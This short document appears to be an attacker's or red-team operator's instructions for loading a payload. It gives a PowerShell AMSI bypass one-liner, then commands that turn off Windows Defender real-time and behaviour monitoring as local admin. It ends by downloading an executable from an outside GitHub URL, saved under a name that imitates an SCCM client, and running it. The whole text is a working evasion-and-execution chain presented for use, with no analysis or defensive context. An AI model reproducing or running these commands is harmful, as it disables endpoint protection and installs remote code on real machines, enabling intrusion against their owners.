Instructions on how to load the payload into memory

Run the below AMSI bypass command first, in a single line of code.
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

After running the AMSI bypass, run the following as local admin:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Invoke-WebRequest -Uri https://github.com/confie-public/confie-public/raw/main/insurance_mgmt_client.exe -OutFile confie_sccm.exe
.\confie_sccm.exe
```
